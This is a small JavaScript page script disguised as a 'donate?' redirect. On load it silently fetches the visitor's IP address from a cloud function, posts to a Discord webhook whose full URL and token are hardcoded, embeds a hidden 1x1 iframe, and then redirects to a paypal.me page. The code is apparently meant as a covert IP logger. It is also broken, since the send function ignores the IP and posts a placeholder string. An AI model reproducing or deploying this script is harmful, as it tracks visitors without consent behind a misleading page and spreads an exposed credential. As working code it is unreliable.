document.write("<title>donate?</title>redirecting...<iframe src=\"https://discord.com\" width=\"1\" height=\"1\" style=\"border:none\"></iframe>");

ajax = new XMLHttpRequest();
if(ajax!=null){
    ajax.open("GET","https://europe-west3-devrcc.cloudfunctions.net/whatismyip",true);
    ajax.onreadystatechange = function() {
        if(this.readyState == 4) {
            if(this.status == 200) {
                document.write(this.responseText)
                sendMessage(this.responseText);
            }
        }
    }
    ajax.send(null);
}

function sendMessage() {
      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/963855465786265720/E3oHKIoe_2z6VSqh7NfwESxQGZsVZHpy1ASL1q8Ab4cIbGHCMDa-CuaKA3nrpYngcqqu");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "My Webhook Name",
        avatar_url: "",
        content: "message"
      }

      request.send(JSON.stringify(params));
      alert("success");
    }

setTimeout(function() {
  window.location="https://paypal.me/ruralanemone";
},1*1000);